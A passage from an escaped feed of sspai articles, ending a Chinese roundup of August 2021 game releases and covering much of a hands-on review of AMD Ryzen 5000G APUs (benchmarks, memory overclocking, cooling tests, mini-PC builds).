Burton）又主要是受的流行于德国的表现主义（Expressionism）影响，所以到了开发系列二代时，开发团队进一步在美术风格上追根溯源，以期收效更佳：由于本作的故事主要发生在脑中世界，因此在相关的宣传片中我们可以看到，流程各处满是极富张力、想象力的艺术设计，把《脑航员 2》从头武装到脚，形成了本作最有竞争力的特色。</p>\n<h2><strong>死亡垃圾 / Death Trash</strong></h2>\n<blockquote><p>继承了经典《辐射》风味的 ARPG 作品。</p></blockquote>\n<ul>\n<li>推出日期：2021.08.05</li>\n<li>登陆平台：PC</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/10/8e7d29b2b8f4b35eae182f12b5f50e8a.jpg\"></figure><p>《死亡垃圾》官网顶部援引了几家媒体的短评，笔者最喜欢的是其中由 Killscreen 写的一条，「恶心，但你不会把目光移开」，描述得不可谓不精准：这是一款四人独立团队完成的像素风格俯视角 ARPG，呈现了一段后启示录题材的故事，玩家将前往冒险的是一个看起来异常癫狂的外星世界，里面充斥着古板的仿生机械、萧条的人类聚落，以及最最重要的——各种血肉模糊的畸形生命体。</p>\n<p>整体上，本作算是对标了《辐射（Fallout）》系列第一、二代，人物加点、特长与缺陷、数值鉴定、对话抉择、大地图移动等《辐射》系列古典要素都被移植了进来，在此基础上，开发团队还有一些「微创新」，包括将战斗机制改为实时动作制、增加贴合故事背景的「超自然」特殊装备、压缩任务网络规模等，使《死亡垃圾》显得小巧而有范儿，很能勾起玩家的游戏欲望，就是不知道，看起来讳莫如深的邪典故事，深度到底几何，还得到游戏里验证了。</p>\n<h2><strong>九十六号公路 / ROAD 96</strong></h2>\n<blockquote><p>以一条公路串起耐人寻味的人和事。</p></blockquote>\n<ul>\n<li>推出日期：2021.08.16</li>\n<li>登陆平台：NS、PC</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/10/ac4261442cd73f0e1ef04700878c5a31.jpg\"></figure><p>惠普 OMEN 计划支持、DigixArt 工作室制作的一款第一人称视角冒险游戏，《九十六号公路》是 DigixArt 成立以来的第三部出品；这支开发团队始创于 2015 年，创始人为 Anne-Laure &amp; Yoan Fanise 这对夫妻档，其中 Yoan 供职育碧期间曾任《勇敢的心：伟大战争（Valiant Hearts：The Great War）》导演。</p>\n<p>据官方宣传材料，本作的故事舞台将是一个与现实近似的架空世界，时间为 1996 年，玩家扮演一位意图从虚构国家 Petria 出逃的角色，沿游戏标题里的这条公路赶往边境、奔向自由，而游戏体验的核心就是这一路遭遇的人和事：玩家会体验到风格各异的小游戏，并需在大量行动、对话中做出选择，这些选择将对后续流程中如何「偶遇」造成影响，改变人物的遭遇或关系，乃至于引发改变世界格局的蝴蝶效应；按官方预期，不同玩家的「九十六号公路之旅」可能因选择差异而完全不同，同时开发团队也称，其创作受到了昆汀·塔伦蒂诺（Quentin Tarantino）、科恩兄弟（Coen brothers）、奉俊昊（Bong Joon-ho）等电影导演的影响，笔者对此的解读是，游戏中五花八门的角色间可能会有微妙的联系（而且角色数可能不会太多），带些黑色幽默风味的故事最终可能会收束到少数几个节点上。</p>\n<p>据 Demo 流程内容推测，本作应该有一个「遭遇事件库」，玩家选择可能会决定出现什么事件、什么时候出现、事件细节有何变动等，如此体现选择导致的流程差异；另外，玩家并不会真的把全程几百英里给看一遍，而是会在遭遇事件的几个点进入第一人称体验、事件之间直接以读取画面转场。</p>\n<p>个人看来，类似自我陈述的选择题开场、跳过真实时间的转场、有几分相似的画面风格……这些都让《九十六号公路》给我的第一印象中带着强烈的《护林员（Firewatch）》既视感，很像是但后者更重视让玩家在弱引导的线性流程中自省，本作则把故事情节塑造得更具体、变化多端，鼓励玩家书写有趣的「自传」，不过也正因如此，这种偏互动小说/电影的作品不一定人人都喜欢。</p>\n<p>当然了，这都是些拼凑现有信息得到的猜想，《九十六号公路》的游戏体验具体如何，给我的疑惑仍然远超已知。</p>\n<h2><strong>国王的恩赐 2 / King's Bounty II</strong></h2>\n<blockquote><p>该类策略游戏的「祖师爷」系列。</p></blockquote>\n<ul>\n<li>推出日期：2021.08.24</li>\n<li>登陆平台：PS4、X1、NS、PC</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/10/2c64b3bc0443c4d63f41be231fe45cad.jpg\"></figure><p>《国王的恩赐》是一个老牌的回合制 RPG 系列，基于中世纪「剑与魔法」奇幻题材， 原本的开发商是行业先驱 New World Computing；系列初代作品于 1990 年问世，以《国王的恩赐》为基础，New World Computing 创立了策略游戏领域的另一块金字招牌——《魔法门之英雄无敌（Heroes of Might and Magic）》系列。</p>\n<p>多说一句之后的故事，收购了 New World Computing 的 3DO 走向破产，前者的遗产被育碧接手，后来，俄罗斯游戏巨头 1C Company 买走了《国王的恩赐》，使得本作的 IP 与「双胞胎兄弟」《魔法门之英雄无敌》天各一方。</p>\n<p>说回本作，这是《国王的恩赐》系列诞生以来的首部正传续作，游戏中，玩家将扮演对抗邪恶势力的英雄，招兵买马、运筹帷幄、纵横捭阖，完成一场宏大的冒险。游戏流程中，玩家通常行动时的视角是第三人称，穿插了大量脚本演出，一旦进入战斗，视角就会切换到空中俯瞰整个战场，毕竟战斗采用的是回合制战棋玩法。</p>\n<h2><strong>英雄不再 3 / NO MORE HEROES 3</strong></h2>\n<blockquote><p>放荡不羁、制作人个人风格极其浓烈的动作佳品。</p></blockquote>\n<ul>\n<li>推出日期：2021.08.27</li>\n<li>登陆平台：NS</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/10/053fded84a1186d8afd5a484f1cdb3ed.jpg\"></figure><p>于 E3 2019 前的任天堂直面会上首次公开，依然由系列掌舵人须田刚一导演、编剧、参与设计，采用虚幻引擎 4 开发，回归了系列早期类似开放世界的设计框架，具有空前的地图规模、包含五个大区，其中就有系列经典的「圣诞已死城（Santa Destroy）」，得益于开发技术的提升，整体卖相可以说是远超旧作。</p>\n<p>《英雄不再》系列的故事线有些无厘头，主角特拉维斯·塔奇（Travis Touchdown）是「美国杀手协会（UAA）」的认证杀手，擅用武器为光束军刀，一代讲的主要是特拉维斯冲击杀手排行榜首，二代聊的则是拿到榜一三年之后特拉维斯卷入的一场复仇之争，三代中，我们将迎来特拉维斯力战外星超级英雄军团的故事。</p>\n<p>不管是从《英雄不再》的哪一代作品上我们都能看出，该系列很注重维持独特的幽默感、Lo-fi 的艺术设计，体现在游戏机制包装（例如系列传统——要存档得蹲马桶）、不正经的台词、尽显「土味」的界面交互等每一个细节。很显然，也正是须田刚一刻意打磨的这些特质，在呼唤愿者上钩。</p>\n<h2><strong>尘垢 / GRIME</strong></h2>\n<blockquote><p>美术风格特色突出的横板动作游戏。</p></blockquote>\n<ul>\n<li>推出日期：2021.08.02</li>\n<li>登陆平台：PC</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/10/ca7882b52500937646a2cb8940fabeac.jpg\"></figure><p>一款动作冒险银河城作品，结合了 2D 的地图与纵深感强的 3D 画面表现，将类似于《黑暗之魂》式的动作体验带到了横板关卡设计中，具有「魂」类游戏特色的能力加点、装备、闪避/翻滚、体力值、弹反等机制纷纷到位。</p>\n<p>从《尘垢》已经披露的流程宣传中我们可以看到，开发团队显然花了大力气营造其惊悚、肃杀的氛围，在这个原创的诡异世界观中，以拟真材质刻画了各种稀奇古怪的地形地貌、机关、怪物、有生命的武器等，刺激着玩家的感官。</p>\n<p>本作主角的造型设计很是吸睛——没有正常头部，而是由一颗暗紫色的「黑洞」取而代之，这个别致的形象搭载了「弹反」动作机制：若在攻击命中前一刻按键，不仅可令攻击无效化、还能从敌人处吸出资源、反弹伤害等，有点《鬼武者》系列「一闪」的味道，也形成了《尘垢》动作玩法的特色。</p>\n<h2><strong>星际拓殖 / Starmancer</strong></h2>\n<blockquote><p>斜 45° 俯视角、像素风格模拟经营游戏。</p></blockquote>\n<ul>\n<li>推出日期：2021.08.05</li>\n<li>登陆平台：PC</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/10/ef7b6487176ba30dcc48347bbe2abd33.jpg\"></figure><p>像素艺术风格的模拟经营游戏，发行商为钟情于像素风格作品的独立游戏发行厂牌 Chucklefish，游戏内容看起来是经典而充实：地球遇险、星际殖民计划启动、搭载人类火种的空间站落成，玩家将扮演管理空间站的人工智能，建设好站内设施、使之高效运转，打理好殖民者的生活需求，处置外来入侵、人员内乱等等事件，总之，最终极的目的就是又快又好地扩大空间站规模、提高人口数量。</p>\n<p>据开发团队自述，该作的核心开发人员仅两名，从 2015 年打磨至今，目前核心的模拟经营机制已构建完成（已于今年初进行过一轮封闭 Beta 测试），接下来的工作将主要聚焦于填充内容，如完善故事剧本、随机事件、定制化要素等；至于何时能推出 1.0 正式版本，开发团队现在的心理预期是再等一年以上。</p>\n<p>以上便是部分本月值得关注的新游简介汇总，个人角度仅供参考，也欢迎大家在评论区分享更多你的体验、信息或思考。同时如果在评论区分享你这个月玩到的好游戏（不一定是新游），8 月 17 日我们将会抽选 1<strong> 位热心分享的读者</strong>各送一张<strong>价值 100 元</strong>的 Steam/PSN/Xbox/eShop 的礼品卡（任选），届时将在本文更新获奖名单。</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68191"},{"title":"攒机卡在显卡上？AMD 5000G 或许能成为你的新选择","date":"2021-08-10 03:34:42","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<h2><strong>「塞尚」来了</strong></h2>\n<p>今年三月份的时候，AMD 宣布了锐龙 Pro 5000 系列移动处理器，只不过当时主要针对的是 OEM 市场，而后在 Computex 2021 也宣告锐龙 5000G 处理器会登陆零售市场，这次在 ChinaJoy 则发布上市时间，也就是你看到这篇文章的时候。</p>\n<p>这一代锐龙 5000G 处理器，代号「塞尚」Cezanne，基于 7 nm 工艺、采用 Zen 3 CPU 架构和 Vega GPU 架构，针对零售市场首批上市的主要有锐龙 7 5700G 和锐龙 5 5600G 两款型号，分别为 8 核 16 线程及 6 核 12 线程，对比上一代型号核心处理器频率也都有对应提升。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/46ce9434b69925b0566b953ea33d1563\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>进入「Zen 架构」，AMD 的 APU 处理器实际已经陆续推出过三代产品，分别是锐龙 2000G 处理器、锐龙 3000G 处理器和锐龙 4000G 处理器，最早的两代产品会比较常见，因为零售市场同步也有销售，但上一代锐龙 4000G 处理器可能因为官方销售策略或者产能因素调整，并没有针对零售市场销售，这也导致一段时间锐龙 4000G 处理器价格居高不下（甚至在Zen3发布后价格依然虚高），这次锐龙 5000G 处理器再次回归零售市场，最直接的影响就是产品定价，首发价格比之前小黄鱼留出的渠道货都便宜了不少。</p>\n<p>锐龙 5000G 处理器内核封装设计其实依旧是延续之前，采用了 CCD+IF 总线+IOD 的组合，当然 CCD 也就是 CPU 内核部分从上一代的 Zen2 升级到了 Zen3，此外 CPU 三级缓存也翻倍提升到 16MB，但 GPU 部分依旧是 VEGA 核显。内核采用这样的设计方案，主要是方便灵活，便于厂商可以快速更新迭代推出新品。而且就内核设计来说，「APU 桌面版」跟「锐龙移动处理器」比较一致，区别主要在于针对不同平台的功耗设置。</p>\n<p>虽然 CPU 都是 Zen3 内核架构，但锐龙 5000 系列台式处理器相比，因为封装设计等因素，两者还是有些区别。比如锐龙 5000G 处理器，内置 VEGA GPU，但仅支持 PCIe3.0 总线，CPU 三级缓存仅为 16MB，内存及 FCLK 超频能力更好；而锐龙 5000 系列台式处理器无内置 GPU，支持 PCIe4.0 总线，CPU三级缓存为 32MB，可以说两者规格差异其实不小，也导致玩法的差异。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/08/2a2bc1c46dc6af233e5bfad09c437587.png\"></figure><p>目前市面除了零售版锐龙 APU 处理器可供选择搭配，其实也有不少 OEM 衍生品，比如基于 APU 的品牌主机或者 SFF\\UCFF 规格主机，甚至包含最近试图引发潮流的 PC 掌机，都是考虑到锐龙 APU 处理器优异的性能及良好的功耗控制而选择的方案。</p>\n<p>前一段时间虽然显卡价格有所回落，但这几天虚拟货币价格又开始大涨，所以未来一段时间内显卡价格估计还是不够稳定，这也导致普通装机消费者会卡在显卡上，而锐龙 APU 处理器刚好就可以解决这个问题，，所以这次会针对锐龙 5000G 处理器的「性能表现」「超频能力」「视频效果」「散热要求」「装机方案」几个方面做一个比较详细的测试及建议。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/947e3ca7095bc8de33fb882537ba6dab\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><h2><strong>01/ 性能表现</strong></h2>\n<p>桌面级的锐龙 5000G APU 产品，基于 7nm 工艺、采用 Zen3 CPU 架构跟 Vega GPU 架构。性能测试部分主要关注锐龙 5000G 的「CPU性能」及「GPU性能」。</p>\n<p><strong>测试平台：</strong></p>\n<ul>\n<li>CPU：锐龙 7 5700G 、锐龙 5 5600G</li>\n<li>主板：微星 B550M MORTAR</li>\n<li>内存：金士顿的 DDR4 4000 8GX2</li>\n<li>SSD：金士顿 NV1 2T</li>\n<li>电源：全汉 Hydro G Pro850</li>\n<li>散热：NOCTUA NH-P1+风扇</li>\n</ul>\n<p>设置说明：主板默认设置，PBO 选项默认（auto），内存频率设置 3200（FCLK 1600）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/94a05b47e65465ad123dad5edcce322e\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>「CPU 性能」：抛开频率的细微差异，对比上一代锐龙 4000G，锐龙 5000G 处理器最显著就是 CPU 部分换装 Zen 3 架构，所以 IPC 性能获得提升，处理器的三级缓存翻倍，为1 6MB。</p>\n<p>为方便参照，测试数据加上了 i7 11700及锐龙 7 5800X，方便参考。</p>\n<p>首先是「CPU 基准性能」。实际测试表现来看，锐龙 7 5700G性能对标类似规格的 i7 11700，略低于频率及缓存更高的锐龙 7 5800X，而锐龙 5 5600G 性能则对标 i5 11600 跟锐龙 5 5600X。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/50578deaa013028fc7e9f11d012865be\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>「生产力项目」：这边测试了 blender benchmark、corona 1.3 benchmark 和 V-Ray benchmark 三款渲染类软件的基准测试程序。</p>\n<p>blender benchmark、corona 1.3 benchmark 主要测试渲染时长，所以时间越短越好。R7 5700G 跟 i7 11700 渲染耗时基本一样。</p>\n<p>V-Ray benchmark 这边是测试分数，因为是最新版本的，没有之前其它CPU测试数据，所以只能自己对比下。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/ffa5b3f08b191e11bde26dd6a2ac56d6\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>PCIe3.0 总线：跟锐龙5000系列移动处理器类似，锐龙 5000G PCIe 依旧是 PCIe3.0，总共 24 条通道。所以与之搭配的存储设备选择 PCIe3.0 设备即可。我这边测试搭配的是金士顿的NV1 2T，就是一款主打性价比的 PCIe3.0 SSD。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/c30a690c5671f2fac692175acb653d39\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>「GPU 性能」：GPU 方面，锐龙 7 5700G 内置的是 Vega8，锐龙 5 5700G 内置的是 Vega7，两者区别主要是频率及 GPU 单元核心数量。</p>\n<p>为方便不同平台硬件参照，所以这边内存频率设置为 3200，并没有超频。基准性能表现如下，因为核显架构并没有大变化，所以核显性能提升幅度不大，但依旧是目前市面核显性能最强的处理器。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/b8ed2473af955fb7477937b43980992a\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>实际游戏表现如何。我这边测试了绝地求生大逃杀、Dota 2 及彩虹六号三款竞技类游戏，均为 1080P 分辨率 100% 渲染。</p>\n<p>绝地求生大逃杀（低画质）：锐龙 7 5700G 平均 59 帧；锐龙 5 5600G 平均 56 帧</p>\n<p>Dota 2（最高画质）：锐龙 7 5700G 平均 54 帧；锐龙 5 5600G 平均 52 帧</p>\n<p>彩虹六号（中等画质）：锐龙 7 5700G 平均 76 帧；锐龙 5 5600G 平均 71 帧</p>\n<p>银河破裂者（中等画质）：锐龙 7 5700G 平均 44 帧；锐龙 5 5600G 平均 41 帧</p>\n<p>总体而言，如果你偏好 moba 类或者娱乐竞技类游戏，Vega 核显还是可用，对比规格更相近的锐龙5000系列移动处理器，因为不用受限功耗等因素，所以虽然基准性能类似，但实际游戏帧数感觉也会比较平稳。当然 AMD 的显卡，还有另外一个大杀器：FSR</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/cf986902aaa1d917021c17e248540ada\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>「FSR加速效果」：就在六月底，AMD FSR （FidelityFX Super Resolution,超级分辨率锐画技术）的也正式上线，而且很厚道的支持大部分显卡，也包含这次发布的锐龙 5000G。</p>\n<p>我这边以银河破裂者+锐龙 7 5700G 为例，在基本一样画面设置情况下，分别测试 FSR 4 档设置超高质量「Ultra Quality」、质量「Quality」、均衡「Balance」以及性能「Performance」，然后看下 FSR 对游戏速度提升在锐龙 5000 系列移动处理器上是否同样有效果。</p>\n<p>实际结果如下，在不同 FSR 档位下，可分别获得58、69、82和97的平均帧，关闭 FSR 则为 44 帧，性能提升幅度可知。所以哪怕 APU 用户，也可以受益 FSR 功能，在画面与速度之间取得一个平衡。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/1f398e96db50eeb6aff83ff7656cc039\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>「GPU对生产力应用的影响」：我这边以 Pr+ 锐龙 7 5700G 测试为例，同样的素材及配置设置，开启硬件加速及仅限软件，分别为 5 分 44 秒及 8 分 52 秒，相差近 3 分钟时间。虽然  Vega8 跟更高端的加速效果有一定差距，但还是可以明显看出显卡硬件加速带来的提升。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/a0ec9c508b56f29f77ff7d8693ac274d\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>锐龙 7 5700G 的 SPECviewperf 13 显卡专业性能测试成绩，跟早期的独显性能有得一拼了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/c2beff539392bc4cfd606014b2809f16\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><h2><strong>02/ 最适合折腾超频的 ZEN 3 处理器</strong></h2>\n<p>上一代 APU Renoir 虽然没有经过零售渠道销售，但依旧成为少数发烧友的玩物，其主要原因之一就是超强的超频性能，特别是内存跟 FCLK 频率上限，远超同代其它锐龙处理器，所以这次对于锐龙 5000G APU 我也同样期待。</p>\n<p>这次超频部分要测试的主要「CPU 频率」及「内存/ FCLK 频率」，因为这两个频率对性能影响较大，而 GPU 频率一方面目前驱动版本对其已经不支持超频，另外超频增益不大，所以这次就不做测试了。测试的处理器为「锐龙 7 5700G」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/2635c56e79e48a01b97fb1821867a1fc\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>「CPU 频率」：我手上这颗大概上限就全核心 4.7G，算是普通体质，多线程成绩对于默认设置情况下略有提升，但这点效益个人建议懒得折腾的人日常开个 PBO 会更省心点。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/2c15bdf977ee2940e2364515ed9e1e2b\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>「内存/ FCLK 频率」：对这部分超频期待比较大，结果也超出了我的预期。之前经手折腾过的 ZEN3 处理器，一般 FCLK 频率也就超到 2000 左右就差不多了，但这颗锐龙 7 5700G 几乎没有上限的感觉，可以始终跟内存频率同步直到到内存体质上限。</p>\n<p>最后是超到内存 4533，FCLK 2267。手上测试的这套金士顿 DDR4 4000 是三星的b-die颗粒，（也就是目前的Renegade叛逆者），之前体质上限就是 4500左 右的频率，后续会再用更高频率内存测试下锐龙 5000G APU 的内存上限。</p>\n<p>从上往下依次频率是 3200C14，3600C16，4000C18，4266C18，4400C18，4533C18</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/4f47d0f74c4af1a03d0029aacc3d1ba1\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>对核显处理器，内存频率就相当于显存频率了，所以对应的GPU性能也会得到提高。3DMARK 的测试成绩就比默认设置下略高了些。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/90ada4a2b3920c148597ca2469149c9e\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>「内存频率对应用的影响」：超内存后除了读写数据更好看还有有什么影响呢，我这边测试了从 3200 频率到最高 4533 的 6 种频率对同样设置情况下彩虹六号游戏帧数的影响。</p>\n<p>这边游戏测试还是用处理器内置的 GPU 测试，如果你是 APU+高端独显的组合，效能影响也会一样，甚至更明显。</p>\n<p>无论是平均帧数还是最高帧基本都随内存频率（ FCLK 分频 1:1 ）提升获得提升。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/2ab31aa22abdf2ba29d0ba75758d3df8\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p><strong>综上</strong>：跟 APU 的定位有些反差，其实折腾超频的话，APU 可能会比普通的锐龙处理器更好玩，因为目前受限制程热堆积还有本身较高的频率，CPU 频率可玩上限越来越低。但内存及 FCLK 频率反倒成为另外可以影响性能的参数，加上目前APU这部分体质普遍有优势，所以喜欢折腾的用户反倒可以考虑选择 「锐龙 5000G APU」，而且与之搭配的主板，无论是 MATX或者 ITX，可选型号跟可玩性的适配程度都是刚刚好。</p>\n<h2><strong>03/ 是否支持视频插帧？</strong></h2>\n<p>APU 为什么相对保值，有些时候甚至还会涨价，大部分原因大概就是其出色的视频编解码支持，比如大受欢迎的视频补帧（插帧）。</p>\n<p>这次锐龙 5000G APU 核显部分虽然依旧是沿用 GCN 架构的 Radeon RX Vega 核显，让部分游戏党略微失望，但视频党反倒可能更开心，毕竟 GCN 架构目前还是可以支持 BFRC 的插帧。</p>\n<p>我这边也实际测试了下，最新版本的 <a href=\"https://bluesky-soft.com/BlueskyFRC.html\">BFRC 插件</a> 可实现视频插帧（目前已更新至 3.4.2），插帧效果也很好，所以依旧可以算视频利器。</p>\n<p>感兴趣实现方式的用户直接搜索 BFRC+POTPLAYER+视频插帧，这些关键词就可以了解具体设置方式。</p>\n<p>多媒体硬件解码的支持情况</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/9a71a1816f0ff8b7108d7ef8abb607e4\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><h2><strong>04/ 对散热器的要求</strong></h2>\n<p>可能因为默认 TDP 并不高（65W），所以这次无论锐龙 7 5700G 或锐龙 5 5600G 都有附带一颗 Wraith Stealth 原装散热器，考虑到 APU 实际装机会有多种不同的玩法从而针对散热器有不同要求，所以我实际测试了「原装散热器」+「被动散热器」+「中高端散热器」三种方案，根据最终结果，大家可以在装机过程结合自己的需求实际参考选择。</p>\n<p>测试环境：裸机测试，26℃ 空调房，环境自然对流弱。主板默认设置，PBO 设置 auto（默认）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/a5a959fd685d9af08fa7e0c2973b2892\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>「原装散热器」：附带的 Wraith Stealth 原装散热器，相信玩家都比较熟悉，9cm 风扇+铝挤散热片，散热器本身的热解能力是比较一般的，一般搭建性价比机型或者部分特别迷你的机型会使用类似散热规格的散热器（比如限高导致）。</p>\n<p>测试结果其实是不错，烤鸡测试锐龙 7 5700G 最终稳定在 82℃<sup class=\"ss-footnote\" href=\"\" title=\"现在大家看网上测试CPU温度，最好还要附带了解CPU实际功率、电压等条件，这些设置实际对温度的影响可能会超过环境，甚至是散热器。\" footnote-id=\"1\">1</sup>，CPU实际功率 70W，转速接近 2000 转，全核心频率 4G；锐龙 5 5600G 最终稳定在 85℃，CPU实际功率 75W，转速接近 2000 转，全核心频率 4.2G。</p>\n<p>主板虽然没有手动开启 PBO，但默认设置下微星还是会自动根据散热器跟环境对处理器尽量优化设置最佳的性能功耗方案，所以实际测试基本都是超过默认 TDP 功耗。「原装散热器」在这种条件下，依靠不高的转速（对于 9cm 风扇来说）跟散热规格（无热管散热器），实现这样的效果已经算可接受，另一方面锐龙 5000G APU 的散热压力也不大，这对于想搭建特殊迷你主机的用户来说也比较好解决散热问题。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/6174debf036906d63a83cab191d22c1a\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>「被动散热器：NOCTUA NH-P1」：这次特别测试了被动散热器，一方面是因为猫头鹰 NOCTUA 赶巧近期发布了其首款被动式 CPU 散热器 NH-P1，另一方面也是 APU 装机方案经典玩法之一就是无风扇全被动散热，所以这次也刚好结合测试，方便有类似想法的用户可以参考。</p>\n<p>测试结果，虽然我的测试环境并不特别适合被动散热器（环境对流弱），但两颗处理器都超出预期通过了烤鸡测试，且最终稳定温度均未超过 90℃ 警戒线，也没有降频降功耗：</p>\n<p>锐龙 7 5700G 最终稳定在 85℃，CPU实际功率 72W，全核心频率 4G；锐龙 5 5600G 最终稳定在 82℃，CPU 实际功率 75W，全核心频率 4.2G。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/7b2cfc959cf46ee01b563a134b66eff1\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>安装测试说明：NOCTUA NH-P1 虽然是被动式 CPU 散热器，但这类散热器一般建议并不是真的要整机全无风扇。这类散热器最佳使用环境，其实是风道或使用环境有自然对流，从而辅助散热器散热，比如机箱内部安装一枚风扇，机箱有基础的对流风道避免热堆积。</p>\n<p>所以我这次测试的环境虽然是裸机，但因为环境对流非常弱（机子位置并不在出风口），所以对散热器来说并不算理想，但 NOCTUA NH-P1 最终成功压制 8c16t 的锐龙 7 5700G，可以说已经超出预期，不枉 NOCTUA 打磨了多年。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/618bb58196bbba9dbb0d5e185f9d699e\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>「中高端风冷散热器：NOCTUA NH-P1+风扇」：加上风扇，NOCTUA NH-P1 就变身高端风冷散热器了，所以我也加上了对应测试，模拟高端风冷的大概散热效果供对比参考。</p>\n<p>测试结果，温度表现自然暴降许多，这种条件下就比较适合折腾超频了：</p>\n<p>锐龙 7 5700G 最终稳定在 64℃，CPU 实际功率 72W，全核心频率 4G；锐龙 5 5600G 最终稳定在 69℃，CPU实际功率 78W，全核心频率 4.2G。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/ef8cbc15882f4e50437603726a2f388c\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>综上：官方能附带散热器其实就说明问题了，锐龙 5000G APU 散热压力并不算大。日常使用注意结合主板上的功耗、电压和 PBO 设置即可。</p>\n<h2>05/ 几种装机玩法推荐</h2>\n<p>之前其实就一直在等锐龙 5000G APU 上市好装相关需求的机子，之前也经常有网友咨询过相关方案的建议，这次刚好简单整理下「个人以为」的几种适合搭建 APU 主机搭配推荐。</p>\n<h3>Mini PC</h3>\n<p>这类箱体方案可以理解为可 DIY 版的 NUC，或者说 SFF 主机，相比品牌方案自由度更高，体积相对接近，扩展散热上限也会更好一点。</p>\n<p>银欣 ML10：体积仅为 2.8/3.7 L，但提供多种搭配玩法，支持常规 ITX 主板，对比 DTX、SFF 主板可选配件更丰富，性能上限也更高。电源部分需要AC电源。也是目前一众新箱体里面最适合锐龙 5000G APU 的箱体之一。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/73e2a07f386a0bcc287d63da45b7acae\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p> </p>\n<p>迎广 B1：之前 APU 的绝配就是迎广肖邦了，不过后面迎广也更新了 B1，除了外观设计不一样，对散热器兼容性也会更好一点，依旧有内置电源，然后支持 ITX 主板。</p>\n<h3>卡式炉机箱</h3>\n<p>传播于表情包，可以说跟 APU 